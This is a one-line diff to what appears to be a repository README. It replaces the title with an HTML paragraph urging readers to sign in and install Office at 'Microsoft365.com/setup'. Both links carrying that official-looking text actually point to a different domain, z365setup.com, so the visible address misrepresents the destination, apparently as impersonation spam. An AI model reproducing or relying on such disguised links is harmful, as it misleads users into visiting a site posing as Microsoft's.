@@ -1,1 +1,1 @@
-# microsoft365.com-setup
+<p>Click download and install Office at <a href="https://z365setup.com/">Microsoft365.com/setup</a> once you Sign In to Microsoft 365 account.Make sure you have created the account; however, you can use OneDrive, Outlook.com, Skype, or Xbox Live accounts for Sign In. If you have not purchased the Microsoft subscription yet, then don&rsquo;t worry, the <a href="https://z365setup.com/">microsoft365.com/setup</a> will take you to the correct webpage.</p>
